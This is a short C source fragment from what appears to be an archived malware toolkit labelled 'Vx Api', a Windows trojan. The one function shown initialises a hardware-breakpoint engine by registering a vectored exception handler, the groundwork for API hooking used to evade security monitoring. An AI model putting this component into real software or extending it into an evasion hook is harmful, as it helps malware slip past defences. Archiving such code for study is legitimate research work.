/*
  name      Vx Api
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Win32Helper.h"

BOOL InitHardwareBreakpointEngine(VOID)
{
	if (GlobalHardwareBreakpointObject.IsInit)
		return TRUE;

	GlobalHardwareBreakpointObject.HandlerObject = AddVectoredExceptionHandler(1, ExceptionHandlerCallbackRoutine);
	if (!GlobalHardwareBreakpointObject.HandlerObject)
		return FALSE;

	InitializeCriticalSection(&CriticalSection);

	GlobalHardwareBreakpointObject.IsInit = TRUE;

	return TRUE;
}